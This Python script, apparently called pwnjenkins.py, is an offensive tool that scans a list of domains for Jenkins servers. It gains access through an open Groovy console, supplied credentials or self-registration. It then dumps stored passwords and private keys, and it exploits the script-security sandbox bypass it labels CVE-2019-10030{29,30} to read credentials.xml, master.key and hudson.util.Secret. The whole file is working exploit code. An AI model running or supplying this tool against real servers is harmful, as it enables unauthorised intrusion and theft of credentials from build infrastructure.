import re
import sys
import requests
import urllib
import getpass
import random
from bs4 import BeautifulSoup
from base64 import b64decode
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

#proxy={'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}
proxy={}

def isBase64Encoded(s):
    pattern = re.compile("^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$")
    if not s or len(s) < 1:
        return False
    else:
        return pattern.match(s)

def Jenkins_Crumb(url,cookie_name,cookie_value):
	global crumb
	r = requests.get(url+'crumbIssuer/api/xml?xpath=concat(//crumbRequestField,":",//crumb)',cookies={cookie_name:cookie_value},verify=False)
	if 'Jenkins-Crumb' in r.text:
		crumb=r.text
		crumb=crumb.split(':')[1]
		return crumb
	else:
		return ''

def CheckRCE(domain,url,file):
	if file=='credentials':
		filename='/var/lib/jenkins/credentials.xml'
	elif file=="masterkey":
		filename='/var/lib/jenkins/secrets/master.key'
	else:
		filename='/var/lib/jenkins/secrets/hudson.util.Secret'
	r = requests.post(url+'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/',data={'sandbox':'True','value':'''class abcd{abcd(){def proc="base64 -w0 %s".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);String p="\\n";String q=os.toString();throw new Exception(p.concat(q))}}'''%(filename)},verify=False,proxies=proxy)
	msg=BeautifulSoup(r.text,'html.parser')
	out = msg.find('pre').text
	f=open('exception.txt','w')
	f.write(out)
	f.close()
	try:
		content=open('exception.txt','r').readlines()
		for line in content:
			if isBase64Encoded(line):
				if file=='credentials':
					try:
						domain,port=domain.split(':')
						open(domain+'_credentials_xml','w').write(b64decode(line))
						break
					except:
						open(domain+'_credentials_xml','w').write(b64decode(line))
						break
				elif file=='masterkey':
					try:
						domain,port=domain.split(':')
						open(domain+'_master_key','w').write(b64decode(line))
						break
					except:
						open(domain+'_master_key','w').write(b64decode(line))
						break
				else:
					try:
						domain,port=domain.split(':')
						open(domain+'_hudson_secret','w').write(b64decode(line))
						break
					except:
						open(domain+'_hudson_secret','w').write(b64decode(line))
						break
	except Exception as e:
		print e

def groovy_dump(domain,url,cookie_name,cookie_value):
	json= urllib.unquote('%7B%22script%22%3A%20%22def%20creds%20%3D%20com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials%28%5Cn%20%20%20%20com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class%2C%5Cn%20%20%20%20Jenkins.instance%2C%5Cn%20%20%20%20null%2C%5Cn%20%20%20%20null%5Cn%29%3B%5Cnfor%20%28c%20in%20creds%29%20%7B%5Cn%20%20%20%20%20println%28%20%28%20c.properties.privateKeySource%20%3F%20%5C%22ID%3A%20%5C%22%20%20%20c.id%20%20%20%5C%22%2C%20UserName%3A%20%5C%22%20%20%20c.username%20%20%20%5C%22%2C%20Private%20Key%3A%20%5C%22%20%20%20c.getPrivateKey%28%29%20%3A%20%5C%22%5C%22%29%29%5Cn%7D%5Cnfor%20%28c%20in%20creds%29%20%7B%5Cn%20%20%20%20%20println%28%20%28%20c.properties.password%20%3F%20%5C%22ID%3A%20%5C%22%20%20%20c.id%20%20%20%5C%22%2C%20UserName%3A%20%5C%22%20%20%20c.username%20%20%20%5C%22%2C%20Password%3A%20%5C%22%20%20%20c.password%20%3A%20%5C%22%5C%22%29%29%5Cn%7D%22%2C%20%22%22%3A%20%22%22%7D')
	r = requests.post(url+'script',cookies={cookie_name:cookie_value},data={'script':'''def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,Jenkins.instance,null,null);for(c in creds){println( ( c.properties.privateKeySource ? "ID: " + c.id + ", UserName: " + c.username + ", Private Key: " + c.getPrivateKey() : ""))}
for(c in creds){println( ( c.properties.password ? "ID: " + c.id + ", UserName: " + c.username + ", Password: " + c.password : ""))} ''','json':json,'Jenkins-Crumb':Jenkins_Crumb(url,cookie_name,cookie_value),'Submit':'Run'},proxies=proxy,verify=False)
	msg=BeautifulSoup(r.text,'html.parser')
	try:
		out=msg.find('h2').findNext('pre').text
		print '		[*] Dumping Creds to file'
		try:
			domain,port=domain.split(':')
			open(domain+'_creds_dump.txt','w').write(out)
		except:
			open(domain+'_creds_dump.txt','w').write(out)
	except:
		print '		[!] Access Denied'

def checkscript_rce(domain,url,cookie_name,cookie_value):
	print '	[+] Checking CheckScript RCE (CVE-2019-10030{29,30})'
	r = requests.post(url+'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/',data={'sandbox':'True','value':'''class abcd{abcd(){def proc="echo owned".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'''},verify=False,proxies=proxy,cookies={cookie_name:cookie_value})
	if 'owned' in r.text:
		print '		[*] Vulnerable. Dumping Creds and Secrets'
		CheckRCE(domain,url,'credentials')
		CheckRCE(domain,url,'masterkey')
		CheckRCE(domain,url,'secret')
	else:
		print '		[!] Not Vulnerable'

def pwn(domain,url,username,password):
	print '	[+] Checking Groovy Console Access'
	try:
		r=requests.get(url+'script/console',verify=False,proxies=proxy)
		if 'Create an account' in r.text or 'Authentication required' in r.text:
			print '	[!] Require Login.'
			json="{'j_username':%s,'j_password':%s,'Submit':'Sign in'}"%(username,password)
			r=requests.post(url+'j_acegi_security_check',data={'j_username':username,'j_password':password,'Submit':'Sign in'},allow_redirects=False,proxies=proxy,verify=False)
			try:
				cookie_name=r.headers['Set-Cookie'].split(';')[0].split('=')[0]
				cookie_value=r.headers['Set-Cookie'].split(';')[0].split('=')[1]
				if 'loginError' in r.headers['Location']:
						print Nope				
				else:
					print '		[*] Logged in :)'
				groovy_dump(domain,url,cookie_name,cookie_value)
			except:
				print "		[!] Login failed with provided credentials"
				print '		[+] Trying Sign Up...'
				user='red'+str(random.randint(1000,99999))
				json="{'username':%s,'password1':'MrR3boot','password2':'MrR3boot','fullname':'RedTeamRockz','email':'pwn@red.com'}"%(user)
				r = requests.post(url+'securityRealm/createAccount',data={'username':user,'password1':'redteam','password2':'redteam','fullname':'RedTeamRockz','email':'pwn@red.com','json':json,'Submit':'Sign up'},verify=False,proxies=proxy,allow_redirects=False)
				try:
					cookie_name=r.headers['Set-Cookie'].split(';')[0].split('=')[0]
					cookie_value=r.headers['Set-Cookie'].split(';')[0].split('=')[1]
					print '			[*] Logged in :)'
					groovy_dump(domain,url,cookie_name,cookie_value)
					checkscript_rce(domain,url,cookie_name,cookie_value)
				except:
					print '			[!] Registration failed'
		else:
			print '	[*] Unauthenticated Groovy Console Access'
			json= urllib.unquote('%7B%22script%22%3A%20%22def%20creds%20%3D%20com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials%28%5Cn%20%20%20%20com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class%2C%5Cn%20%20%20%20Jenkins.instance%2C%5Cn%20%20%20%20null%2C%5Cn%20%20%20%20null%5Cn%29%3B%5Cnfor%20%28c%20in%20creds%29%20%7B%5Cn%20%20%20%20%20println%28%20%28%20c.properties.privateKeySource%20%3F%20%5C%22ID%3A%20%5C%22%20%20%20c.id%20%20%20%5C%22%2C%20UserName%3A%20%5C%22%20%20%20c.username%20%20%20%5C%22%2C%20Private%20Key%3A%20%5C%22%20%20%20c.getPrivateKey%28%29%20%3A%20%5C%22%5C%22%29%29%5Cn%7D%5Cnfor%20%28c%20in%20creds%29%20%7B%5Cn%20%20%20%20%20println%28%20%28%20c.properties.password%20%3F%20%5C%22ID%3A%20%5C%22%20%20%20c.id%20%20%20%5C%22%2C%20UserName%3A%20%5C%22%20%20%20c.username%20%20%20%5C%22%2C%20Password%3A%20%5C%22%20%20%20c.password%20%3A%20%5C%22%5C%22%29%29%5Cn%7D%22%2C%20%22%22%3A%20%22%22%7D')
			r = requests.post(url+'script',data={'script':'''def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,Jenkins.instance,null,null);for(c in creds){println( ( c.properties.privateKeySource ? "ID: " + c.id + ", UserName: " + c.username + ", Private Key: " + c.getPrivateKey() : ""))}
for(c in creds){println( ( c.properties.password ? "ID: " + c.id + ", UserName: " + c.username + ", Password: " + c.password : ""))} ''','json':json,'Jenkins-Crumb':Jenkins_Crumb(url,'test','test'),'Submit':'Run'},proxies=proxy,verify=False)
			msg=BeautifulSoup(r.text,'html.parser')
			try:
				out=msg.find('h2').findNext('pre').text
				print '		[*] Dumping Creds to file'
				try:
					domain,port=domain.split(':')
					open(domain+'_creds_dump.txt','w').write(out)
				except:
					open(domain+'_creds_dump.txt','w').write(out)
			except:
				print '			[!] Access Denied'
	except Exception as e:
		print e


def ping(url,username,password):
	proto=['http://','https://']
	#What if there is different port ? Simple put it after domain ex: xyz.com:1234
	for prot in proto:
		try:
			r=requests.get(prot+url,verify=False)
			if 'X-Jenkins' in r.headers:
				print '	[*] Version: %s'%(r.headers["X-Jenkins"])
				pwn(url,r.url,username,password)
				break
			else:
				r=requests.get(prot+url+'/jenkins',verify=False)
				if 'X-Jenkins' in r.headers:
					print '	[*] Version: %s'%(r.headers["X-Jenkins"])
					pwn(url,r.url,username,password)
					break
				else:
					print '	[!] Not a Jenkins Instance'
		except Exception as HTTPSConnectionPool:
			print '	[!] Timed Out'

if __name__=="__main__":
	if len(sys.argv)==1:
		print '\nUsage : python pwnjenkins.py domains.txt (For diff ports ex: abc.xyz:8080)\n\nCurrent Checks:\n\t1. Auth/Unauthenticated Groovy Console (Provided Creds/Registration)\n\t2. CVE-2019-10030{29,30}[Only uses exception to get secrets]'
	else:
		print '[+] Please provide credentials if you have any or just press enter to continue..'
		username=raw_input('	Username: ').strip()
		password=getpass.getpass('	Password: ').strip()
		content=open(sys.argv[1],'r').readlines()
		for domain in content:
			print '[+] Working on {}'.format(domain.strip())
			ping(domain.strip(),username,password)
